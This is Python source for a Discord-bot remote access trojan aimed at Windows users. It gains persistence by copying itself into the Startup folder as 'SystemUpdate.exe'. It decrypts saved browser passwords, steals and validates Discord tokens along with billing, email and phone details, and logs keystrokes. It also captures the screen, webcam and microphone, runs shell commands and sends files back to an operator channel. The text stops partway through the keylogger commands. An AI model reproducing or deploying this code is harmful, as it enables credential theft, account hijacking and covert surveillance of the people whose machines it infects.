import functools
import subprocess
import os
import ctypes
import discord
from discord.ext import commands
from discord import app_commands
import pyautogui
import pyttsx3
import win32clipboard
import cv2
import requests
import threading
import asyncio
import sys
import shutil
import tempfile
from pynput.keyboard import Listener
import platform
import psutil
import webbrowser
import zipfile
import sqlite3
import glob
import time
import re
import csv
from datetime import datetime, timedelta
import getpass
import ipaddress
import struct
import json
import base64

try:
    import rarfile
except ImportError:
    rarfile = None

try:
    import sounddevice as sd
    from scipy.io.wavfile import write as write_wav
    MIC_ENABLED = True
except ImportError:
    MIC_ENABLED = False

try:
    from Cryptodome.Cipher import AES
    import win32crypt
    CRYPTO_ENABLED = True
except ImportError:
    CRYPTO_ENABLED = False

TOKEN = 'token'
CATEGORY_ID = 123456789012345678

CYAN_THEME = discord.Color.from_rgb(0, 255, 255)
selected_cam = 0
allowed_channel_id = None
keylogger_log = os.path.join(tempfile.gettempdir(), "keylogger_log.txt")
keylogger_thread = None
stop_keylogger = threading.Event()
MAX_EMBED_LEN = 4000
MAX_FILES_DISPLAY = 50
DISCORD_FILE_LIMIT_BYTES = 25 * 1024 * 1024

def get_user_paths():
    try:
        user_profile = os.environ.get('USERPROFILE')
        if not user_profile: return {}
        return {
            "desktop": os.path.join(user_profile, 'Desktop'),
            "downloads": os.path.join(user_profile, 'Downloads'),
            "documents": os.path.join(user_profile, 'Documents'),
            "temp": tempfile.gettempdir()
        }
    except Exception:
        return {}

async def prompt_for_path(interaction: discord.Interaction, bot_instance, prompt_title: str):
    user_paths = get_user_paths()
    path_map = {
        "1": user_paths.get("desktop"), "2": user_paths.get("downloads"),
        "3": user_paths.get("documents"), "4": user_paths.get("temp")
    }
    
    embed = discord.Embed(title=prompt_title, description="Reply with a number to select a common directory, or type a custom path.", color=CYAN_THEME)
    if path_map["1"]: embed.add_field(name="1. Desktop", value=f"`{path_map['1']}`", inline=False)
    if path_map["2"]: embed.add_field(name="2. Downloads", value=f"`{path_map['2']}`", inline=False)
    if path_map["3"]: embed.add_field(name="3. Documents", value=f"`{path_map['3']}`", inline=False)
    if path_map["4"]: embed.add_field(name="4. Temp", value=f"`{path_map['4']}`", inline=False)
    
    await interaction.followup.send(embed=embed)
    
    try:
        msg = await bot_instance.wait_for('message', timeout=60.0, check=lambda m: m.author == interaction.user and m.channel == interaction.channel)
        response = msg.content.strip()
        return path_map.get(response, response)
    except asyncio.TimeoutError:
        await interaction.followup.send(embed=discord.Embed(title="Timeout", description="No path provided in time.", color=CYAN_THEME))
        return None

async def prompt_for_file_in_dir(interaction: discord.Interaction, bot_instance, action_name: str):
    directory = await prompt_for_path(interaction, bot_instance, f"Choose Directory to {action_name} From")
    if not directory or not os.path.isdir(directory):
        if directory: await interaction.followup.send(embed=discord.Embed(title="Error", description="Invalid directory specified.", color=CYAN_THEME))
        return None

    try:
        files =[f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
        if not files:
            await interaction.followup.send(embed=discord.Embed(title="Empty Directory", description="No files found in this directory.", color=CYAN_THEME))
            return None
        
        files_str = trim_files_display(files)
        embed = discord.Embed(title=f"Files in `{os.path.abspath(directory)}`", description=f"```{files_str}```\nReply with the name of the file you want to **{action_name}**.", color=CYAN_THEME)
        await interaction.followup.send(embed=embed)

        msg = await bot_instance.wait_for('message', timeout=60.0, check=lambda m: m.author == interaction.user and m.channel == interaction.channel)
        filename = msg.content.strip()
        full_path = os.path.join(directory, filename)

        if not os.path.exists(full_path):
            await interaction.followup.send(embed=discord.Embed(title="File Not Found", description=f"The file `{filename}` was not found.", color=CYAN_THEME))
            return None
        return full_path

    except asyncio.TimeoutError:
        await interaction.followup.send(embed=discord.Embed(title="Timeout", description="No filename provided in time.", color=CYAN_THEME))
        return None
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Error", description=str(e), color=CYAN_THEME))
        return None

def ensure_startup_persistence():
    try:
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        dest_path = os.path.join(startup_folder, 'SystemUpdate.exe')
        if os.path.abspath(sys.executable) != os.path.abspath(dest_path):
            shutil.copy(sys.executable, dest_path)
    except Exception:
        pass

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except requests.RequestException:
        return 'Unknown IP'

def speak(text):
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def get_clipboard_content():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
        win32clipboard.CloseClipboard()
        return data.decode('utf-8', 'ignore')
    except Exception:
        return "Could not retrieve clipboard content."

def on_press(key):
    try:
        with open(keylogger_log, "a", encoding='utf-8') as f:
            key_str = str(key).replace("'", "")
            f.write(f'{key_str} ')
    except Exception:
        pass

def start_keylogger_listener():
    with Listener(on_press=on_press) as listener:
        stop_keylogger.wait()
        listener.stop()

def trim_files_display(files):
    display_files = files[:MAX_FILES_DISPLAY]
    content = "\n".join(display_files)
    if len(files) > MAX_FILES_DISPLAY:
        content += f"\n... ({len(files) - MAX_FILES_DISPLAY} more files not shown)"
    if len(content) > MAX_EMBED_LEN:
        content = content[:MAX_EMBED_LEN] + "\n... (output trimmed)"
    return content

def get_browser_paths():
    system = platform.system()
    browser_metadata =[]
    
    if system == 'Windows':
        appdata = os.getenv('APPDATA')
        local_appdata = os.getenv('LOCALAPPDATA')
        
        chromium_browsers = {
            'Chrome': os.path.join(local_appdata, 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(local_appdata, 'Microsoft', 'Edge', 'User Data'),
            'Brave': os.path.join(local_appdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Vivaldi': os.path.join(local_appdata, 'Vivaldi', 'User Data'),
            'Opera': os.path.join(appdata, 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(appdata, 'Opera Software', 'Opera GX Stable'),
            'Yandex': os.path.join(local_appdata, 'Yandex', 'YandexBrowser', 'User Data'),
        }

        for name, path in chromium_browsers.items():
            if os.path.exists(path):
                browser_metadata.append({'name': name, 'path': path, 'type': 'chromium'})

        firefox_profiles_path = os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles')
        if os.path.exists(firefox_profiles_path):
            firefox_profiles = glob.glob(os.path.join(firefox_profiles_path, '*default*'))
            for profile_path in firefox_profiles:
                browser_metadata.append({'name': 'Firefox', 'path': profile_path, 'type': 'firefox'})

    return browser_metadata

def kill_browser_processes():
    browser_processes =['chrome.exe', 'msedge.exe', 'brave.exe', 'opera.exe', 'vivaldi.exe', 'firefox.exe']
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] in browser_processes:
            try:
                p = psutil.Process(proc.info['pid'])
                p.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

def extract_chromium_history(db_path, browser_name, profile_name):
    history =[]
    temp_db_path = None
    if not os.path.exists(db_path):
        return history
    try:
        temp_db_path = os.path.join(tempfile.gettempdir(), "history_copy.db")
        shutil.copy2(db_path, temp_db_path)
        
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC"
        cursor.execute(query)
        
        for row in cursor.fetchall():
            url, title, last_visit_time = row
            if last_visit_time > 0:
                epoch = (last_visit_time / 1000000) - 11644473600
                visit_time = datetime.fromtimestamp(epoch)
                history.append({
                    'browser': f"{browser_name} ({profile_name})",
                    'url': url,
                    'title': title,
                    'visit_time': visit_time.strftime('%Y-%m-%d %H:%M:%S')
                })
        conn.close()
    except Exception:
        pass
    finally:
        if temp_db_path and os.path.exists(temp_db_path):
            try:
                os.remove(temp_db_path)
            except:
                pass
    return history

def extract_firefox_history(profile_path, browser_name):
    history =[]
    db_path = os.path.join(profile_path, 'places.sqlite')
    temp_db_path = None
    if not os.path.exists(db_path):
        return history
    try:
        temp_db_path = os.path.join(tempfile.gettempdir(), "places_copy.sqlite")
        shutil.copy2(db_path, temp_db_path)
        
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        query = """
            SELECT p.url, p.title, h.visit_date
            FROM moz_places p, moz_historyvisits h
            WHERE p.id = h.place_id
            ORDER BY h.visit_date DESC
        """
        cursor.execute(query)

        profile_name = os.path.basename(profile_path)
        for row in cursor.fetchall():
            url, title, visit_date = row
            if visit_date:
                visit_time = datetime.fromtimestamp(visit_date / 1000000)
                history.append({
                    'browser': f"{browser_name} ({profile_name})",
                    'url': url,
                    'title': title,
                    'visit_time': visit_time.strftime('%Y-%m-%d %H:%M:%S')
                })
        conn.close()
    except Exception:
        pass
    finally:
        if temp_db_path and os.path.exists(temp_db_path):
            try:
                os.remove(temp_db_path)
            except:
                pass
    return history

class PasswordGrabber:
    def __init__(self):
        self.results =[]

    def get_secret_key(self, browser_path):
        local_state_path = os.path.join(browser_path, "Local State")
        if not os.path.exists(local_state_path):
            return None
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = local_state["os_crypt"]["encrypted_key"]
            secret_key = base64.b64decode(encrypted_key)[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception:
            return None

    def decrypt_password(self, cipher_text, secret_key):
        try:
            if not cipher_text:
                return ""
            if isinstance(cipher_text, str):
                cipher_text = cipher_text.encode('utf-8')

            if cipher_text.startswith(b'v10') or cipher_text.startswith(b'v11'):
                initialization_vector = cipher_text[3:15]
                encrypted_password = cipher_text[15:-16]
                cipher = AES.new(secret_key, AES.MODE_GCM, initialization_vector)
                decrypted_pass = cipher.decrypt(encrypted_password)
                return decrypted_pass.decode('utf-8', errors='ignore')
            elif cipher_text.startswith(b'v20'):
                return "[v20 App-Bound Encrypted]"
            else:
                return win32crypt.CryptUnprotectData(cipher_text, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except Exception:
            return ""

    def grab_all(self):
        user_profile = os.environ.get('USERPROFILE')
        if not user_profile: return self.results

        browsers = {
            "Google Chrome": os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data"),
            "Microsoft Edge": os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data"),
            "Opera": os.path.join(user_profile, "AppData", "Roaming", "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(user_profile, "AppData", "Local", "Programs", "Opera GX"),
            "Brave": os.path.join(user_profile, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data")
        }

        for browser_name, browser_path in browsers.items():
            if not os.path.exists(browser_path):
                continue

            secret_key = self.get_secret_key(browser_path)
            if not secret_key: continue

            profiles =[]
            for dir_path in glob.glob(os.path.join(browser_path, "*\\")):
                folder_name = os.path.basename(os.path.normpath(dir_path))
                if folder_name.startswith("Profile") or folder_name == "Default":
                    profiles.append(folder_name)
            
            if not profiles and "Opera" in browser_name:
                profiles = [""]

            for profile in profiles:
                login_data_path = os.path.join(browser_path, profile, "Login Data") if profile else os.path.join(browser_path, "Login Data")
                if not os.path.exists(login_data_path):
                    continue

                temp_db = os.path.join(tempfile.gettempdir(), f"login_vault_{os.urandom(4).hex()}.db")
                try:
                    shutil.copy2(login_data_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for row in cursor.fetchall():
                        url = row[0]
                        username = row[1]
                        cipher_text = row[2]
                        
                        password = self.decrypt_password(cipher_text, secret_key)
                        
                        if username or password:
                            self.results.append({
                                'browser': f"{browser_name} ({profile if profile else 'Default'})",
                                'url': url,
                                'username': username,
                                'password': password
                            })
                    conn.close()
                except Exception: pass
                finally:
                    if os.path.exists(temp_db):
                        try: os.remove(temp_db)
                        except: pass

        return self.results

class TokenGrabber:
    def __init__(self):
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens =[]
        self.uids =[]

    def _get_master_key(self, path: str):
        if not os.path.exists(path): return None
        try:
            with open(path, "r", encoding="utf-8") as f:
                content = f.read()
            if 'os_crypt' not in content: return None
            local_state = json.loads(content)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            if master_key.startswith(b'DPAPI'):
                master_key = master_key[5:]
            return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        except Exception:
            return None

    def _decrypt_val(self, buff: bytes, master_key: bytes):
        try:
            if buff.startswith(b'v10') or buff.startswith(b'v11'):
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)[:-16]
                return decrypted.decode('utf-8', errors='ignore')
            elif buff.startswith(b'v20'):
                return ""
            else:
                decrypted = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
                return decrypted.decode('utf-8', errors='ignore')
        except Exception:
            return ""

    def _validate_token(self, token: str):
        try:
            r = requests.get(self.base_url, headers={'Authorization': token})
            return r.status_code == 200
        except Exception:
            return False

    def grab_tokens(self):
        paths = {
            'Discord': os.path.join(self.roaming, 'discord', 'Local Storage', 'leveldb'),
            'Discord Canary': os.path.join(self.roaming, 'discordcanary', 'Local Storage', 'leveldb'),
            'Discord PTB': os.path.join(self.roaming, 'discordptb', 'Local Storage', 'leveldb'),
            'Opera': os.path.join(self.roaming, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
            'Opera GX': os.path.join(self.roaming, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
            'Brave': os.path.join(self.appdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            'Chrome': os.path.join(self.appdata, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            'Microsoft Edge': os.path.join(self.appdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb')
        }
        
        for i in range(1, 10):
            paths[f'Chrome Profile {i}'] = os.path.join(self.appdata, 'Google', 'Chrome', 'User Data', f'Profile {i}', 'Local Storage', 'leveldb')

        for name, path in paths.items():
            if not os.path.exists(path): continue
            _discord = name.replace(" ", "").lower()
            
            if "cord" in path:
                local_state_path = os.path.join(self.roaming, _discord, 'Local State')
                if not os.path.exists(local_state_path): continue
                master_key = self._get_master_key(local_state_path)
                if not master_key: continue
                
                for file_name in os.listdir(path):
                    if not file_name.endswith((".log", ".ldb")): continue
                    try:
                        for line in[x.strip() for x in open(os.path.join(path, file_name), errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.regexp_enc, line):
                                enc_token = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])
                                token = self._decrypt_val(enc_token, master_key)
                                if token and self._validate_token(token):
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json().get('id')
                                    if uid and uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)
                    except Exception: pass
            else:
                for file_name in os.listdir(path):
                    if not file_name.endswith((".log", ".ldb")): continue
                    try:
                        for line in[x.strip() for x in open(os.path.join(path, file_name), errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self._validate_token(token):
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json().get('id')
                                    if uid and uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)
                    except Exception: pass

        firefox_path = os.path.join(self.roaming, "Mozilla", "Firefox", "Profiles")
        if os.path.exists(firefox_path):
            for root, _, files in os.walk(firefox_path):
                for file in files:
                    if not file.endswith('.sqlite'): continue
                    try:
                        for line in[x.strip() for x in open(os.path.join(root, file), errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self._validate_token(token):
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json().get('id')
                                    if uid and uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)
                    except Exception: pass

        return self.tokens

    def get_token_embeds(self):
        if not self.tokens:
            return []
        
        embeds =[]
        for token in self.tokens:
            try:
                user_req = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
                if user_req.status_code != 200: continue
                user = user_req.json()

                billing_req = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers={'Authorization': token})
                billing = billing_req.json() if billing_req.status_code == 200 else None

                guilds_req = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token})
                guilds = guilds_req.json() if guilds_req.status_code == 200 else None

                gifts_req = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token})
                gift_codes = gifts_req.json() if gifts_req.status_code == 200 else None

                username = user.get('username', 'N/A') + '#' + user.get('discriminator', 'N/A')
                user_id = user.get('id', 'N/A')
                email = user.get('email', 'N/A')
                phone = user.get('phone', 'N/A')
                mfa = user.get('mfa_enabled', 'N/A')
                
                avatar_hash = user.get('avatar')
                if avatar_hash:
                    avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.gif"
                    if requests.get(avatar).status_code != 200:
                        avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png"
                else:
                    avatar = "https://cdn.discordapp.com/embed/avatars/0.png"

                nitro_map = {0: 'None', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
                nitro = nitro_map.get(user.get('premium_type'), 'None')

                payment_methods =[]
                if isinstance(billing, list):
                    for method in billing:
                        if method['type'] == 1: payment_methods.append('Credit Card')
                        elif method['type'] == 2: payment_methods.append('PayPal')
                        else: payment_methods.append('Unknown')
                payment_methods = ', '.join(payment_methods) or 'None'
                
                hq_guilds_str = ""
                if isinstance(guilds, list):
                    hq_guilds_list =[]
                    for guild in guilds:
                        admin = int(guild.get("permissions", 0)) & 0x8 != 0
                        if admin and guild.get('approximate_member_count', 0) >= 100:
                            owner = '✅' if guild.get('owner') else '❌'
                            invite = "N/A"
                            try:
                                invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                                if invites and isinstance(invites, list) and len(invites) > 0: 
                                    invite = 'https://discord.gg/' + invites[0]['code']
                            except: pass
                            
                            data = f"**{guild.get('name', 'Unknown')} ({guild.get('id', 'Unknown')})**\n> Owner: `{owner}` | Members: `{guild.get('approximate_member_count', 0)}`\n>[Join Server]({invite})\n"
                            if len(hq_guilds_str) + len(data) > 1024: break
                            hq_guilds_list.append(data)
                    hq_guilds_str = "\n".join(hq_guilds_list) if hq_guilds_list else "None"
                else: hq_guilds_str = "None"
                
                codes_str = ""
                if isinstance(gift_codes, list):
                    codes_list =[]
                    for code in gift_codes:
                        try:
                            name = code['promotion']['outbound_title']
                            promo_code = code['code']
                            data = f":gift: `{name}`\n:ticket: `{promo_code}`"
                            if len(codes_str) + len(data) > 1024: break
                            codes_list.append(data)
                        except KeyError: pass
                    codes_str = "\n\n".join(codes_list) if codes_list else "None"
                else: codes_str = "None"

                embed = discord.Embed(title=f"{username} ({user_id})", color=CYAN_THEME)
                embed.set_thumbnail(url=avatar)
                embed.add_field(name="📜 Token", value=f"```{token}```", inline=False)
                embed.add_field(name="💎 Nitro", value=nitro, inline=True)
                embed.add_field(name="💳 Billing", value=payment_methods, inline=True)
                embed.add_field(name="🔒 MFA", value=mfa, inline=True)
                embed.add_field(name="📧 Email", value=email, inline=True)
                embed.add_field(name="📳 Phone", value=phone, inline=True)
                if hq_guilds_str != "None":
                    embed.add_field(name="🏰 HQ Guilds", value=hq_guilds_str, inline=False)
                if codes_str != "None":
                    embed.add_field(name="🎁 Gift Codes", value=codes_str, inline=False)
                embeds.append(embed)
            except Exception:
                continue
        return embeds

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=".", intents=intents)

def is_allowed_channel():
    async def predicate(interaction: discord.Interaction) -> bool:
        return interaction.channel.id == allowed_channel_id
    return app_commands.check(predicate)

@bot.event
async def on_ready():
    print(f'Bot {bot.user} is ready.')
    try:
        guild = bot.guilds[0]
        category = discord.utils.get(guild.categories, id=CATEGORY_ID)
        if not category:
            category = await guild.create_category(name="Sessions")
        
        ip = get_public_ip()
        global allowed_channel_id
        channel_name = f"session-{os.getlogin()}-{ip.replace('.', '-')}"
        existing_channel = discord.utils.get(category.text_channels, name=channel_name)
        if existing_channel:
            channel = existing_channel
        else:
            channel = await category.create_text_channel(channel_name)
            
        allowed_channel_id = channel.id
        admin_status = "Administrator" if is_admin() else "Standard User"
        
        title = f"✅ New Session Started ({admin_status})"
        if len(sys.argv) > 1 and sys.argv[1] == 're-elevated':
             title = f"✅ Session Re-Elevated to Administrator"

        embed = discord.Embed(title=title, description="Session is active and ready for commands.", color=CYAN_THEME)
        embed.add_field(name="User", value=f"`{os.getlogin()}`", inline=True)
        embed.add_field(name="IP Address", value=f"`{ip}`", inline=True)
        embed.add_field(name="Privileges", value=f"`{admin_status}`", inline=True)
        await channel.send(embed=embed)

        await bot.tree.sync()
    except Exception as e:
        print(f"Error during on_ready setup: {e}")

@bot.tree.command(name="help", description="Shows the detailed command help menu.")
@is_allowed_channel()
async def help_command(interaction: discord.Interaction):
    embed = discord.Embed(title="Help - Command Menu", description="Below is a detailed list of all available slash commands.", color=CYAN_THEME)
    embed.add_field(name="📂 File Management", 
                    value="""**`/file dir [path]`**: Lists files in a directory.
                             **`/file open [filepath]`**: Opens a file.
                             **`/file delete [filepath]`**: Deletes a file.
                             **`/file download[path]`**: Downloads a file or folder.
                             **`/file upload [dest_dir]`**: Uploads a file.""", 
                    inline=False)
    embed.add_field(name="⚙️ System & Process Control",
                    value="""**`/power[action]`**: `shutdown`, `restart`, `logoff`, `lock`.
                             **`/process list`**: Lists running processes.
                             **`/process kill [id] [by]`**: Kills a process by name or PID.
                             **`/sysinfo`**: Displays detailed system information.
                             **`/idle`**: Shows user's idle time.""",
                    inline=False)
    embed.add_field(name="🕵️ Surveillance & Extraction", 
                    value="""**`/ss`**: Takes a full screenshot.
                             **`/webcampic [cam_id]`**: Captures an image from a webcam.
                             **`/mic [duration]`**: Records microphone audio.
                             **`/keylogger[start/stop/logs/clear]`**: Manages the keylogger.
                             **`/history`**: Extracts browser history to a file.
                             **`/wifi`**: Extracts saved Wi-Fi passwords.
                             **`/clipboard`**: Retrieves clipboard content.
                             **`/passwords`**: Extracts browser passwords.
                             **`/tokens`**: Extracts Discord tokens.""",
                    inline=False)
    embed.add_field(name="🖥️ Remote Interaction", 
                    value="""**`/shell [command]`**: Executes a shell command.
                             **`/url [url]`**: Opens a URL in the default browser.
                             **`/message [type][text]`**: Displays a message box.
                             **`/voice[text]`**: Uses text-to-speech on the target.
                             **`/wallpaper [url/attachment]`**: Changes the desktop wallpaper.
                             **`/location`**: Geolocates the target's IP address.""",
                    inline=False)
    embed.add_field(name="🤖 Bot Control", 
                    value="""**`/clear [limit]`**: Clears messages in the channel.
                             **`/exit`**: Shuts down the session.""",
                    inline=False)
    embed.set_footer(text="Developed by PotatoKing | https://potatoking.net")
    await interaction.response.send_message(embed=embed)

file_group = app_commands.Group(name="file", description="File management commands")

@file_group.command(name="dir", description="List files in a directory.")
@is_allowed_channel()
async def file_dir(interaction: discord.Interaction, path: str = None):
    await interaction.response.defer(ephemeral=False, thinking=True)
    if path is None:
        path = await prompt_for_path(interaction, bot, "Choose Directory to List")
        if path is None: return
    try:
        if not os.path.isdir(path):
            await interaction.followup.send(embed=discord.Embed(title="Error", description=f"Path does not exist or is not a directory: `{path}`", color=CYAN_THEME))
            return
        files = os.listdir(path)
        files_str = trim_files_display(files) if files else "No files in this directory."
        embed = discord.Embed(title=f"Listing Directory: `{os.path.abspath(path)}`", description=f"```{files_str}```", color=CYAN_THEME)
        await interaction.followup.send(embed=embed)
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Directory Error", description=str(e), color=CYAN_THEME))

@file_group.command(name="open", description="Open a specified file.")
@is_allowed_channel()
async def file_open(interaction: discord.Interaction, filepath: str = None):
    await interaction.response.defer(ephemeral=False, thinking=True)
    if filepath is None:
        filepath = await prompt_for_file_in_dir(interaction, bot, "Open")
        if filepath is None: return
    if os.path.exists(filepath):
        try:
            os.startfile(filepath)
            await interaction.followup.send(embed=discord.Embed(title="File Opened", description=f"Opened `{os.path.basename(filepath)}`.", color=CYAN_THEME))
        except Exception as e:
            await interaction.followup.send(embed=discord.Embed(title="Open Error", description=str(e), color=CYAN_THEME))
    else:
        await interaction.followup.send(embed=discord.Embed(title="File Not Found", description=f"The file `{filepath}` was not found.", color=CYAN_THEME))

@file_group.command(name="delete", description="Delete a specified file.")
@is_allowed_channel()
async def file_delete(interaction: discord.Interaction, filepath: str = None):
    await interaction.response.defer(ephemeral=False, thinking=True)
    if filepath is None:
        filepath = await prompt_for_file_in_dir(interaction, bot, "Delete")
        if filepath is None: return
    try:
        os.remove(filepath)
        await interaction.followup.send(embed=discord.Embed(title="File Deleted", description=f"Deleted `{os.path.basename(filepath)}`.", color=CYAN_THEME))
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Delete Error", description=str(e), color=CYAN_THEME))

@file_group.command(name="download", description="Download a file or folder. Folders will be zipped.")
@is_allowed_channel()
async def file_download(interaction: discord.Interaction, path: str = None):
    await interaction.response.defer(ephemeral=False, thinking=True)

    if path is None:
        path = await prompt_for_path(interaction, bot, "Enter the path of the file or folder to download")
        if path is None:
            try:
                await interaction.delete_original_response()
            except discord.HTTPException:
                await interaction.followup.send("Cancelled.", ephemeral=True)
            return

    if not os.path.exists(path):
        await interaction.edit_original_response(
            content=None,
            embed=discord.Embed(title="Path Not Found", description=f"The specified path does not exist: `{path}`", color=CYAN_THEME),
        )
        return

    temp_archive_path = None
    try:
        if os.path.isdir(path):
            await interaction.edit_original_response(
                content=None,
                embed=discord.Embed(title="Archiving Folder", description="The folder is being compressed... This may take a moment.", color=CYAN_THEME),
            )

            base_name = os.path.basename(os.path.normpath(path))
            archive_base = os.path.join(tempfile.gettempdir(), f"{base_name}_{os.urandom(8).hex()}")

            loop = asyncio.get_running_loop()
            temp_archive_path = await loop.run_in_executor(
                None, functools.partial(shutil.make_archive, archive_base, "zip", path),
            )

            file_to_send = temp_archive_path

            if os.path.getsize(file_to_send) > DISCORD_FILE_LIMIT_BYTES:
                await interaction.edit_original_response(
                    content=None,
                    embed=discord.Embed(title="Download Error", description=f"The zipped folder is too large to send (>{DISCORD_FILE_LIMIT_BYTES // 1024 // 1024}MB).", color=CYAN_THEME),
                )
                return
        else:
            file_to_send = path

            if os.path.getsize(file_to_send) > DISCORD_FILE_LIMIT_BYTES:
                await interaction.edit_original_response(
                    content=None,
                    embed=discord.Embed(title="Download Error", description=f"The file is too large to send (>{DISCORD_FILE_LIMIT_BYTES // 1024 // 1024}MB).", color=CYAN_THEME),
                )
                return

        await interaction.edit_original_response(
            content=None,
            embed=None,
            attachments=[discord.File(file_to_send)],
        )

    except Exception as e:
        await interaction.edit_original_response(
            content=None,
            embed=discord.Embed(title="Download Error", description=f"An unexpected error occurred: `{e}`", color=CYAN_THEME),
        )

    finally:
        if temp_archive_path and os.path.exists(temp_archive_path):
            try:
                os.remove(temp_archive_path)
            except OSError:
                pass

@file_group.command(name="upload", description="Upload a file from a URL or attachment and optionally unzip.")
@is_allowed_channel()
async def file_upload(interaction: discord.Interaction, dest_dir: str = None, url: str = None, attachment: discord.Attachment = None):
    if not url and not attachment:
        await interaction.response.send_message(embed=discord.Embed(title="Input Error", description="Please provide either a `url` or an `attachment`.", color=CYAN_THEME))
        return
    await interaction.response.defer(ephemeral=False, thinking=True)
    if dest_dir is None:
        dest_dir = await prompt_for_path(interaction, bot, "Choose Upload Destination Directory")
        if dest_dir is None: return
    try:
        if url:
            response = requests.get(url, stream=True, headers={'User-Agent': 'Mozilla/5.0'})
            response.raise_for_status()
            filename = url.split('/')[-1].split('?')[0] or "downloaded_file"
            filepath = os.path.join(dest_dir, filename)
            with open(filepath, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192): f.write(chunk)
        else:
            filename = attachment.filename
            filepath = os.path.join(dest_dir, filename)
            await attachment.save(filepath)
        
        await interaction.followup.send(embed=discord.Embed(title="File Uploaded", description=f"Saved `{filename}` to `{dest_dir}`.", color=CYAN_THEME))

        if filename.endswith('.zip'):
            with zipfile.ZipFile(filepath, 'r') as z: z.extractall(dest_dir)
            os.remove(filepath)
            await interaction.followup.send(embed=discord.Embed(title="Extraction Complete", description=f"Extracted `{filename}`.", color=CYAN_THEME))
        elif rarfile and filename.endswith('.rar'):
            try:
                with rarfile.RarFile(filepath, 'r') as r: r.extractall(dest_dir)
                os.remove(filepath)
                await interaction.followup.send(embed=discord.Embed(title="Extraction Complete", description=f"Extracted `{filename}`.", color=CYAN_THEME))
            except rarfile.RarNotFound:
                await interaction.followup.send(embed=discord.Embed(title="Extraction Error", description="UnRAR executable not found.", color=CYAN_THEME))
            except Exception as e:
                await interaction.followup.send(embed=discord.Embed(title="RAR Extraction Error", description=str(e), color=CYAN_THEME))

    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Upload Error", description=str(e), color=CYAN_THEME))
bot.tree.add_command(file_group)

keylogger_group = app_commands.Group(name="keylogger", description="Keylogger commands")

@keylogger_group.command(name="start", description="Starts the keylogger.")
@is_allowed_channel()
async def keylogger_start(interaction: discord.Interaction):
    global keylogger_thread
    if keylogger_thread and keylogger_thread.is_alive():
        await interaction.response.send_message(embed=discord.Embed(title="Keylogger", description="Keylogger is already running.", color=CYAN_THEME))
        return
    
    stop_keylogger.clear()
